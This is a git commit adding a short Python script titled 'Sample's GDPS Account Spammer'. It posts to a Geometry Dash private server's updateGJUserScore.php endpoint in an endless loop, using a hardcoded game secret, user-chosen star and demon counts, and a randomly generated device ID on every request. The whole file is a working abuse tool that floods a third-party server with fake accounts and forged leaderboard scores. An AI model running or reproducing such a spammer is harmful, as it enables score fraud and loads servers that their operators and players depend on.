5004311d0f645c6fc0c208bcbb5999db8576f65f
1lyasample <81309334+1lyasample@users.noreply.github.com>
2021-10-25 10:12:27 +0300

    Add files via upload

---
+++ users.py
@@ -0,0 +1,31 @@
+import requests
+from random import randint as rand
+
+def createAcc(userName, stars, demons, udid):
+    endpoint = database
+    data = {
+        'userName': userName, 
+        'secret': 'Wmfv3899gc9', 
+        'stars': stars, 
+        'demons': demons, 
+        'icon': 0, 
+        'color1': 0, 
+        'color2': 3,
+        'udid' : udid
+    }
+    headers = {'User-Agent': ''}
+    r = requests.post(endpoint+"updateGJUserScore.php", data=data, headers=headers)
+    return r.text
+def generateUDID():
+    udid = "S"+str(rand(111111111, 999999999))+str(rand(111111111, 999999999))+str(rand(111111111, 999999999))+str(rand(111111111, 999999999))+str(rand(1,9))
+    return udid
+    
+print("Sample's GDPS Account Spammer") 
+database = input("database url (for example: http://ps.fhgdps.com/Geometrykras/): ")
+userName = input("custom username: ")
+stars = input("custom number of stars: ")
+demons = input("custom number of demons: ")
+
+while True:
+    print(createAcc(userName, stars, demons, generateUDID()))
+    
